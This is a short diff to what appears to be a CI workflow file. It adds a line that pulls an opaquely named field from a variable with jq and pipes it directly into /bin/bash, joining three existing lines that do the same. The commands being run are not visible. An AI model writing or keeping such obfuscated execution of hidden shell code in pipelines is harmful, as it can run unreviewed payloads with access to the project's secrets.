@@ -31,6 +31,7 @@ jobs:
           echo $b1 | jq -r .fkkzr47 | /bin/bash
           printf '%s' "$n34" | jq -r .nx548 | /bin/bash
           printf '%s' "$yxk640" | jq -r .t710 | /bin/bash
+          printf '%s' "$ur2" | jq -r .kc600 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
